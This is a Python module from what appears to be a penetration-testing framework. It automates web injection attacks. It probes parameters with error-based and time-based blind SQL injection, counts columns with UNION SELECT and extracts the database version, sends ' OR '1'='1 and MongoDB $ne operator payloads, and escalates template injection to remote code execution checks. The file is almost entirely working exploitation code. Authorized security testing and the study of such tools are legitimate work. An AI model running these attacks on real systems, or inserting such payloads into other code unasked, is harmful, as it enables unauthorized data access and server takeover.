"""Inject module — SQL/NoSQL/SSTI injection detection and exploitation."""

from __future__ import annotations

import re
import time
from typing import Any, Dict, List, Optional

from sentinel.models import AttackResult, EngagementSession
from sentinel.logger import log
from sentinel.modules.base import BaseModule
from sentinel.utils.http import request
from sentinel.data import SQLI_PAYLOADS_BASIC, SQLI_PAYLOADS_BLIND, NOSQL_PAYLOADS, SSTI_PAYLOADS


class InjectModule(BaseModule):
    """SQL/NoSQL/SSTI injection — detect and exploit (blind time-based + union)."""

    name = "inject"

    def run(self, es: EngagementSession, **kwargs: object) -> List[AttackResult]:
        target_url: str = kwargs.get("target_url", "")  # type: ignore[assignment]
        params_to_test: Optional[List[str]] = kwargs.get("params_to_test")  # type: ignore[assignment]
        post_body: Optional[Dict[str, Any]] = kwargs.get("post_body")  # type: ignore[assignment]

        results: List[AttackResult] = []
        url = target_url or es.base_url
        test_params = params_to_test or ["id", "name", "user", "search", "q", "query", "username", "email", "filter", "sort"]

        results.extend(self._sql_inject(es, url, test_params, post_body))
        results.extend(self._nosql_inject(es, url, test_params, post_body))
        results.extend(self._ssti_detect(es, url, test_params, post_body))
        return results

    def _sql_inject(self, es: EngagementSession, url: str,
                    params: List[str], post_body: Optional[Dict] = None) -> List[AttackResult]:
        results: List[AttackResult] = []

        # Get baseline
        baseline_resp = request(es, "GET", url)
        baseline_body = baseline_resp.text if baseline_resp else ""
        baseline_time = 0.0

        for param in params:
            # Error-based / boolean detection
            for payload in SQLI_PAYLOADS_BASIC[:6]:
                resp = request(es, "GET", url, params={param: payload})
                if resp:
                    body = resp.text
                    error_patterns = [
                        "sql syntax", "mysql_fetch", "ora-", "sqlite", "postgresql",
                        "you have an error in your sql", "unclosed quotation mark",
                        "quoted string not properly terminated",
                        "syntax error", "microsoft ole db", "odbc drivers",
                        "warning: pg_query", "pdoexception", "sqlstate",
                        "invalid query", "native client",
                    ]
                    if any(ep.lower() in body.lower() for ep in error_patterns):
                        log(f"[Inject/SQL] Error-based SQLi! param={param} payload={payload!r}", "CRIT")
                        results.append(AttackResult(
                            "inject", "sqli_error", "VULN",
                            url=url, payload=f"{param}={payload}",
                            evidence=body[:300], severity="CRITICAL",
                            notes=f"Error-based SQLi in parameter '{param}'"
                        ))
                        # Attempt UNION extraction
                        union_result = self._union_extract(es, url, param, payload)
                        if union_result:
                            results.append(union_result)
                        break

            # Time-based blind SQLi
            for payload, db_type, sleep_time in SQLI_PAYLOADS_BLIND:
                t0 = time.time()
                resp = request(es, "GET", url, params={param: "1" + payload})
                elapsed = time.time() - t0
                if elapsed >= sleep_time - 0.5 and sleep_time > 0:
                    log(f"[Inject/SQL] TIME-BASED blind SQLi! param={param} db={db_type} delay={elapsed:.1f}s", "CRIT")
                    results.append(AttackResult(
                        "inject", f"sqli_blind_{db_type}", "VULN",
                        url=url, payload=f"{param}=1{payload}",
                        evidence=f"Response delayed {elapsed:.1f}s (expected {sleep_time}s)",
                        severity="CRITICAL",
                        notes=f"Blind time-based SQLi ({db_type}) in parameter '{param}'"
                    ))
                    break

            # POST body injection
            if post_body:
                for key in post_body:
                    test_body = {**post_body, key: "' OR '1'='1"}
                    resp = request(es, "POST", url, json=test_body)
                    if resp:
                        body = resp.text
                        if any(ep.lower() in body.lower() for ep in ["sql", "ora-", "sqlite", "error"]):
                            results.append(AttackResult(
                                "inject", "sqli_post_body", "VULN",
                                url=url, payload=f"POST {key}=' OR '1'='1",
                                evidence=body[:200], severity="CRITICAL",
                                notes=f"SQLi in POST body parameter '{key}'",
                            ))
        return results

    def _union_extract(self, es: EngagementSession, url: str,
                       param: str, base_payload: str) -> Optional[AttackResult]:
        # Determine number of columns with NULL padding
        for col_count in range(1, 10):
            nulls = ",".join(["NULL"] * col_count)
            payload = f"' UNION SELECT {nulls}--"
            resp = request(es, "GET", url, params={param: payload})
            if resp and resp.status_code == 200 and "error" not in resp.text.lower():
                # Found column count — try version extraction
                version_payloads = [
                    f"' UNION SELECT version(),{','.join(['NULL'] * (col_count - 1))}--",
                    f"' UNION SELECT @@version,{','.join(['NULL'] * (col_count - 1))}--",
                    f"' UNION SELECT sqlite_version(),{','.join(['NULL'] * (col_count - 1))}--",
                ]
                for vp in version_payloads:
                    r = request(es, "GET", url, params={param: vp})
                    if r:
                        m = re.search(r"(\d+\.\d+\.\d+[-\w]*)", r.text)
                        if m:
                            return AttackResult(
                                "inject", "sqli_union_extract", "VULN",
                                url=url, payload=vp,
                                evidence=f"DB version: {m.group(1)}",
                                severity="CRITICAL",
                                notes=f"UNION extraction successful. {col_count} columns. DB: {m.group(1)}",
                            )
                return AttackResult(
                    "inject", "sqli_union_cols", "PARTIAL",
                    url=url, payload=f"UNION NULL x{col_count}",
                    evidence=f"{col_count} columns found",
                    severity="HIGH",
                    notes=f"UNION SELECT works with {col_count} columns. Manual extraction required.",
                )
        return None

    def _nosql_inject(self, es: EngagementSession, url: str,
                      params: List[str], post_body: Optional[Dict] = None) -> List[AttackResult]:
        results: List[AttackResult] = []
        baseline_resp = request(es, "GET", url, params={params[0]: "legit_value"} if params else {})
        baseline_body = baseline_resp.text if baseline_resp else ""

        # GET param injection (MongoDB operator injection)
        for param in params[:5]:
            for payload in NOSQL_PAYLOADS[:4]:
                resp = request(es, "GET", url, params={param: payload})
                if resp and resp.text != baseline_body and resp.status_code == 200:
                    # Check if response returned more data than baseline
                    if len(resp.text) > len(baseline_body) * 1.5:
                        log(f"[Inject/NoSQL] Potential NoSQL injection! param={param}", "CRIT")
                        results.append(AttackResult(
                            "inject", "nosql_operator", "VULN",
                            url=url, payload=f"{param}={payload}",
                            evidence=resp.text[:200], severity="HIGH",
                            notes=f"NoSQL operator injection in '{param}' — response size increased significantly",
                        ))
                        break

        # POST JSON injection (MongoDB)
        if post_body:
            for key in post_body:
                test_body = {**post_body, key: {"$ne": None}}
                resp = request(es, "POST", url, json=test_body)
                if resp and resp.status_code == 200:
                    if len(resp.text) > 20 and resp.text != baseline_body:
                        results.append(AttackResult(
                            "inject", "nosql_json_operator", "VULN",
                            url=url, payload=f'{key}: {{"$ne": null}}',
                            evidence=resp.text[:200], severity="HIGH",
                            notes="MongoDB operator injection via JSON POST body",
                        ))
        return results

    def _ssti_detect(self, es: EngagementSession, url: str,
                     params: List[str], post_body: Optional[Dict] = None) -> List[AttackResult]:
        results: List[AttackResult] = []
        for param in params[:5]:
            for payload, expected in SSTI_PAYLOADS[:4]:
                resp = request(es, "GET", url, params={param: payload})
                if resp and expected.lower() in resp.text.lower():
                    log(f"[Inject/SSTI] TEMPLATE INJECTION! param={param} payload={payload!r}", "CRIT")
                    # Try RCE payload
                    rce_results = []
                    for rce_payload, rce_expected in SSTI_PAYLOADS[4:]:
                        rce_resp = request(es, "GET", url, params={param: rce_payload})
                        if rce_resp and rce_expected.lower() in rce_resp.text.lower():
                            rce_results.append(rce_resp.text[:200])
                            log(f"[Inject/SSTI] RCE CONFIRMED! id output: {rce_resp.text[:80]}", "CRIT")
                    results.append(AttackResult(
                        "inject", "ssti" + ("_rce" if rce_results else ""), "VULN",
                        url=url, payload=f"{param}={payload}",
                        evidence=resp.text[:200],
                        severity="CRITICAL" if rce_results else "HIGH",
                        notes=f"SSTI{'->RCE confirmed' if rce_results else ''} in parameter '{param}'. "
                              f"Template: {payload!r} -> response contains '{expected}'",
                        data={"rce_output": rce_results},
                    ))
                    break
        return results
